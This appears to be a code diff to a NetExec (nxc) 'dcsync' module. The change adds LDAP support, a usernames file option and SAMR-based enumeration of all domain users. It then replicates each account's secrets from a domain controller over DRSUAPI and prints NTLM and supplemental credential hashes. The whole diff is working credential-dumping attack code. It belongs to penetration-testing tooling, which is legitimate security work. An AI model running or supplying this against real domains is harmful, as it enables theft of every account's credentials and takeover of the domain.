@@ -1,14 +1,16 @@
 
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, DCERPC_v5
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, DCERPC_v5, DCERPCException
 from impacket.dcerpc.v5 import epm, drsuapi, transport, samr
 from impacket.examples.secretsdump import NTDSHashes
+from nxc.connection import connection as Connection
+from impacket.nt_errors import STATUS_MORE_ENTRIES
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.uuid import string_to_bin
-from nxc.connection import connection as Connection
 from nxc.context import Context
-from impacket import ntlm
+from impacket import ntlm, system_errors
 
 from typing import Tuple
+import os
 
 import binascii
 import struct
@@ -21,7 +23,7 @@ class NXCModule:
 
     name = "dcsync"
     description = "DCSync over DCERPC without SMB interaction"
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb", "ldap"]
     opsec_safe = True
     multiple_hosts = False
 
@@ -32,8 +34,21 @@ class NXCModule:
     def options(self, context : Context, module_options: dict):
         r"""
         JUST_DC_USER Extract only data for the user specified.
+        USERSFILE File with usernames to dump (One per line).
         """
         self.__justUser = module_options.get("JUST_DC_USER", None)
+        self.__users = None
+        usersfile = module_options.get("USERSFILE", None)
+
+        if usersfile:
+            if not os.path.exists(usersfile):
+                context.log.fail(f"File {usersfile} not found!")
+            
+            if not os.path.isfile(usersfile):
+                context.log.fail(f"File {usersfile} is not a file!")
+            
+            with open(usersfile) as f:
+                self.__users = f.read().splitlines()
 
     def on_login(self, context : Context, connection: Connection):
         self.__username = connection.username
@@ -47,10 +62,17 @@ class NXCModule:
         self.__hash = context.hash
         self.__aesKey = context.aesKey
         self.__stringbinding = ""
+        self.__context = context
+
+        if not self.__users:
+            if self.__justUser:
+                self.__users = [self.__justUser]
+            else:
+                self.__users = self.__getUsers()
 
         self.__getNTLMHash()
 
-        drsr = self.__getRPCTransport(context)
+        drsr = self.__getRPCTransport(drsuapi.MSRPC_UUID_DRSUAPI, "ncacn_ip_tcp")
         drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
 
         if self.__doKerberos:
@@ -70,33 +92,44 @@ class NXCModule:
         if resp['pmsgOut']['V2']['cItems'] > 0:
             NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
         else:
-            context.log.exception("Couldn't get DC info for domain %s" % DOMAIN)
+            context.log.exception("Couldn't get DC info for domain %s" % self.__domain)
             raise Exception('Fatal, aborting')
         
-        resp = drsuapi.hDRSCrackNames(drsr, hDrs, 0, drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, (self.__justUser,))
+        for user in self.__users:
 
-        if resp['pmsgOut']['V1']['pResult']['cItems'] != 1:
-            raise Exception("User %s not found!" % self.__justUser)
+            resp = drsuapi.hDRSCrackNames(drsr, hDrs, 0, drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, (user,))
 
-        if resp['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
-            raise Exception("ERROR: %s" % 0x2114 + resp['pmsgOut']['V1']['pResult']['rItems'][0]['status'])
+            if resp['pmsgOut']['V1']['pResult']['cItems'] != 1:
+                self.__context.log.fail(f"User {user} not found!")
+                continue
 
-        userGuid = resp['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1]
+            if resp['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
+                error = system_errors.ERROR_MESSAGES[
+                    0x2114 + resp['pmsgOut']['V1']['pResult']['rItems'][0]['status']
+                ]
+                self.__context.log.fail(f"{user} - {error[0]}: {error[1]}")
+                continue
 
-        request = self.__buildNCChanges(userGuid, hDrs, NtdsDsaObjectGuid)
-        resp = drsr.request(request)
+            userGuid = resp['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1]
 
-        replyVersion = 'V%d' % resp['pdwOutVersion']
-        hashes = NTDSDCSyncHashes.decrypt(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])
+            request = self.__buildNCChanges(userGuid, hDrs, NtdsDsaObjectGuid)
+            try:
+                resp = drsr.request(request)
+            except Exception:
+                self.__context.log.fail("You don't have DS-Replication-Get-Changes DS-Replication-Get-Changes-All rights or you are not admin")
+                return
 
-        hashes = self.__justUser + ":" + hashes
+            replyVersion = 'V%d' % resp['pdwOutVersion']
+            hashes = NTDSDCSyncHashes.decrypt(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])
 
-        context.log.highlight(hashes)
+            hashes = user + ":" + hashes
 
-        hashes = NTDSDCSyncHashes.decryptSupplementalInfo(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])
+            context.log.highlight(hashes)
 
-        for h in hashes:
-            context.log.highlight(h)
+            hashes = NTDSDCSyncHashes.decryptSupplementalInfo(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])
+
+            for h in hashes:
+                context.log.highlight(h.replace(self.__domain + "\\", ""))
 
     def __getNTLMHash(self) -> None:
         if self.__hash and ":" in self.__hash[0]:
@@ -107,9 +140,111 @@ class NXCModule:
             self.__nthash = self.__hash[0]
             self.__lmhash = "00000000000000000000000000000000"
 
-    def __getRPCTransport(self, context) -> DCERPC_v5:
-        self.__stringbinding = epm.hept_map(self.__host, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp')
-        context.log.debug(f"StringBinding {self.__stringbinding}")
+    def __getUsers(self) -> list:
+        dce = self.__getRPCTransport(samr.MSRPC_UUID_SAMR, "ncacn_ip_tcp")
+        #stringBinding = epm.hept_map(self.__host, samr.MSRPC_UUID_SAMR, protocol='ncacn_ip_tcp')
+        #dce = DCERPC_v5(stringBinding)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+
+        if self.__doKerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+
+        # Setup Connection
+        try:
+            resp = samr.hSamrConnect2(dce)
+        except Exception:
+            self.__context.log.fail("Can't enumerate users thought SAMR, maybe you are not admin and the Windows Version is >10")
+            return list()
+
+        if resp["ErrorCode"] != 0:
+            raise Exception("Connect error")
+
+        resp2 = samr.hSamrEnumerateDomainsInSamServer(
+            dce,
+            serverHandle=resp["ServerHandle"],
+            enumerationContext=0,
+            preferedMaximumLength=500,
+        )
+        if resp2["ErrorCode"] != 0:
+            raise Exception("Connect error")
+
+        domain_name = resp2["Buffer"]["Buffer"][0]["Name"]
+        resp3 = samr.hSamrLookupDomainInSamServer(
+            dce,
+            serverHandle=resp["ServerHandle"],
+            name=domain_name,
+        )
+        if resp3["ErrorCode"] != 0:
+            raise Exception("Connect error")
+
+        resp4 = samr.hSamrOpenDomain(
+            dce,
+            serverHandle=resp["ServerHandle"],
+            desiredAccess=samr.MAXIMUM_ALLOWED,
+            domainId=resp3["DomainId"],
+        )
+        if resp4["ErrorCode"] != 0:
+            raise Exception("Connect error")
+
+        domains = resp2["Buffer"]["Buffer"]
+        domain_handle = resp4["DomainHandle"]
+        # End Setup
+
+        status = STATUS_MORE_ENTRIES
+        enumerationContext = 0
+        while status == STATUS_MORE_ENTRIES:
+            try:
+                enumerate_users_resp = samr.hSamrEnumerateUsersInDomain(dce, domain_handle, enumerationContext=enumerationContext)
+            except DCERPCException as e:
+                if str(e).find("STATUS_MORE_ENTRIES") < 0:
+                    self.__context.log.fail("Error enumerating domain user(s)")
+                    break
+                enumerate_users_resp = e.get_packet()
+
+            rids = [r["RelativeId"] for r in enumerate_users_resp["Buffer"]["Buffer"]]
+            self.__context.log.debug(f"Full domain RIDs retrieved: {rids}")
+            users = self.__getUserInfo(dce, domain_handle, rids)
+
+            # set these for the while loop
+            enumerationContext = enumerate_users_resp["EnumerationContext"]
+            status = enumerate_users_resp["ErrorCode"]
+
+        dce.disconnect()
+        
+        return users
+
+    def __getUserInfo(self, dce, domain_handle, user_ids) -> list:
+        self.__context.log.debug(f"Getting user info for users: {user_ids}")
+        users = list()
+
+        for user in user_ids:
+            self.__context.log.debug(f"Calling hSamrOpenUser for RID {user}")
+            open_user_resp = samr.hSamrOpenUser(
+                dce,
+                domain_handle,
+                samr.MAXIMUM_ALLOWED,
+                user
+            )
+            info_user_resp = samr.hSamrQueryInformationUser2(
+                dce,
+                open_user_resp["UserHandle"],
+                samr.USER_INFORMATION_CLASS.UserAllInformation
+            )["Buffer"]
+
+            user_info = info_user_resp["All"]
+            user_name = user_info["UserName"]
+
+            users.append(user_name)
+            samr.hSamrCloseHandle(dce, open_user_resp["UserHandle"])
+
+        return users
+
+    def __getRPCTransport(self, uuidAPI, protocol: str) -> DCERPC_v5:
+        self.__stringbinding = epm.hept_map(self.__host, uuidAPI, protocol=protocol)
+        self.__context.log.debug(f"StringBinding {self.__stringbinding}")
 
         rpctransport = transport.DCERPCTransportFactory(self.__stringbinding)
         rpctransport.setRemoteHost(self.__host)
